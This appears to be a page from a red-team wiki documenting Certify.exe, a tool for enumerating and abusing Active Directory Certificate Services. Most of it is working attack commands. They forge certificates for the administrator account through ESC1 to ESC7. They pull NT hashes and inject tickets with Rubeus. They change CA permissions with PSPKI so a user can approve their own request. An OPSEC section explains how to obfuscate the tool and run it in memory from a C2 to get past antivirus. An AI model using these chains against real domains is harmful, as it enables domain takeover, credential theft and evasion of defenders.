# Certify.exe

Windows-native (C#) tool for enumerating and abusing AD CS. Part of the GhostPack toolset by SpecterOps - the Windows counterpart to [Certipy](certipy.md).

- Repo: `GhostPack/Certify`
- Build: Visual Studio -> `Certify.exe` (single binary)
- Requires: .NET Framework 4.5+ on the host, valid domain credentials (Kerberos or the user you're running as)

For attack-specific playbooks (which ESC does what), see [ADCS Attacks](../active-directory/post-compromise/adcs/README.md). This page is the tool reference.

---

## What it covers vs doesn't

| Attack              | Certify.exe alone | Needs a helper                          |
| ------------------- | ----------------- | --------------------------------------- |
| ESC1 / ESC2         | ✅                 | -                                       |
| ESC3                | ✅                 | -                                       |
| ESC4                | ❌ template writes | + **StandIn** or PowerView              |
| ESC6                | ✅                 | -                                       |
| ESC7                | Enumeration only  | + **PSPKI** for officer / template mods |
| ESC8                | ❌                 | + `ntlmrelayx` (Linux/WSL)              |
| Cert -> TGT (PKINIT) | ❌                 | + **Rubeus** `asktgt`                   |

Certify does enumeration + certificate requests. Anything that mutates AD or does PKINIT is another tool.

---

## Enumeration

```powershell
# Everything - CAs, templates, ACLs, EKUs
Certify.exe find

# Only templates that are vulnerable (recommended default)
Certify.exe find /vulnerable

# Only templates enrollable by the *current* user - fast triage
Certify.exe find /vulnerable /currentuser

# Filter by CA
Certify.exe find /ca:CA-HOST\CORP-CA

# Include CN of the enrolling group in output
Certify.exe find /vulnerable /json     # machine-readable

# Enumerate CA permissions (ESC7 recon)
Certify.exe cas

# Dump PKI-related AD objects for a specific principal
Certify.exe find /enrolleeSuppliesSubject
Certify.exe find /clientauth
Certify.exe find /vulnerable /hidden   # include disabled templates
```

Interpret the output the same way as `certipy find`: each vulnerable template lists the ESC number, the principals with enroll rights, and whether Client Authentication is present.

---

## Request a Certificate

```powershell
# ESC1/6 - SAN abuse
Certify.exe request /ca:CA-HOST\CORP-CA /template:VulnerableTemplate /altname:administrator

# Machine SAN (Certifried-style if you also own the computer object)
Certify.exe request /ca:CA-HOST\CORP-CA /template:Machine /altname:DC01$ /machine

# ESC3 - enrollment agent then on-behalf-of
Certify.exe request /ca:CA-HOST\CORP-CA /template:EnrollmentAgentTemplate
Certify.exe request /ca:CA-HOST\CORP-CA /template:UserTemplate `
  /onbehalfof:CORP\administrator `
  /enrollcert:C:\agent.pfx /enrollcertpw:<pfx-pass>

# Include a specific SID extension (post-May-2022 chains)
Certify.exe request /ca:CA-HOST\CORP-CA /template:User /altname:administrator /sidextension:S-1-5-21-...-500
```

Common request flags:

| Flag | Purpose |
|---|---|
| `/ca:HOST\NAME` | Fully-qualified CA - `certutil -config` format |
| `/template:X` | Template to enroll in |
| `/altname:name` | Supply a SAN (UPN or DNS) |
| `/sidextension:S-1-5-...` | Add `szOID_NTDS_CA_SECURITY_EXT` |
| `/onbehalfof:DOM\user` | ESC3 |
| `/enrollcert:file /enrollcertpw:pw` | Cert used to authorize the request (ESC3 agent) |
| `/machine` | Enroll using SYSTEM's Kerberos ticket (needs admin) |
| `/install` | Import the resulting cert into the user's cert store |

Certify prints the PFX inline as base64. Pipe it straight to Rubeus - no file needed.

---

## Retrieve a Pending Request

For ESC7 or any request that goes into `CA_DISP_ISSUED_PENDING` (denied/pending queue).

```powershell
Certify.exe download /ca:CA-HOST\CORP-CA /id:<request-id>
```

Also useful when a request was accepted async and you need to fetch it later.

---

## Authenticate with the Cert (Rubeus)

Certify hands you a base64 PFX. Rubeus does the PKINIT.

```powershell
# TGT for the impersonated identity
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap

# Same but also UnPAC to extract the NT hash (most common)
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials

# If the PFX has a password
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /password:<pfx-pass> /nowrap /getcredentials

# Inject the TGT into the current logon session
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /ptt

# Custom KDC (useful if DNS is broken)
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /dc:dc01.corp.local /domain:corp.local /nowrap
```

---

## Per-ESC Recipes

```powershell
# --- ESC1 / ESC2 / ESC6 ---
Certify.exe request /ca:CA-HOST\CORP-CA /template:<T> /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<b64> /nowrap /getcredentials

# --- ESC3 ---
Certify.exe request /ca:CA-HOST\CORP-CA /template:EATemplate
Certify.exe request /ca:CA-HOST\CORP-CA /template:UserTemplate `
  /onbehalfof:CORP\administrator /enrollcert:C:\agent.pfx /enrollcertpw:pw
Rubeus.exe asktgt /user:administrator /certificate:<b64> /nowrap /getcredentials

# --- ESC4 (needs StandIn) ---
StandIn.exe --adcs --filter T --edit --enrollflag 0x9 --ekus 1.3.6.1.5.5.7.3.2
Certify.exe request /ca:CA-HOST\CORP-CA /template:T /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<b64> /nowrap /getcredentials
StandIn.exe --adcs --filter T --edit --enrollflag <orig> --ekus <orig>

# --- ESC7 (needs PSPKI) ---
Import-Module PSPKI
Get-CertificationAuthority -Name CORP-CA | Get-CertificationAuthorityAcl | `
  Add-CertificationAuthorityAcl -Identity CORP\user -AccessType Allow -AccessMask ManageCertificates | `
  Set-CertificationAuthorityAcl
Get-CertificationAuthority -Name CORP-CA | Add-CATemplate -Template SubCA
Certify.exe request /ca:CA-HOST\CORP-CA /template:SubCA /altname:administrator
Get-CertificationAuthority -Name CORP-CA | Get-PendingRequest -RequestID <id> | Approve-CertificateRequest
Certify.exe download /ca:CA-HOST\CORP-CA /id:<id>
Rubeus.exe asktgt /user:administrator /certificate:<b64> /nowrap /getcredentials
```

---

## OPSEC Notes

- Certify.exe is heavily signatured. AMSI / defender routinely catches the vanilla build. Options: rebuild with obfuscation (ConfuserEx / InvisibilityCloak), run through inline `Assembly.Load`, or execute in-memory via `execute-assembly` from a C2.
- `Certify.exe find` alone hits LDAP heavily - noisier than certipy from Linux because it runs *inside* the domain.
- Cert requests generate **Event ID 4886** on the CA. There's no hiding this.
- `Certify.exe cas` reveals CA officer lists - useful recon but shows up in LDAP monitoring.

---

## Alternatives to Know

| Tool | Role | Notes |
|---|---|---|
| [Certipy](certipy.md) | Linux equivalent | More features (template mod, CA ops, shadow-creds) |
| **StandIn** | Template DACL / attribute writes | Fills the ESC4 gap |
| **PSPKI** | PowerShell module for CA management | Fills the ESC7 gap |
| **Rubeus** | Kerberos client (asktgt with cert) | Required for PKINIT after Certify |
| **ADCSCoercePotato / PetitPotam** | Coerce auth for ESC8 | Feeds ntlmrelayx |
| **ntlmrelayx.py** (Impacket) | The relay side of ESC8 | Linux/WSL only |

---

## Related

- [Certipy](certipy.md) - Linux ADCS toolkit
- [ADCS Attacks](../active-directory/post-compromise/adcs/README.md) - per-ESC playbooks
- [Rubeus](rubeus.md) - Kerberos client used for PKINIT
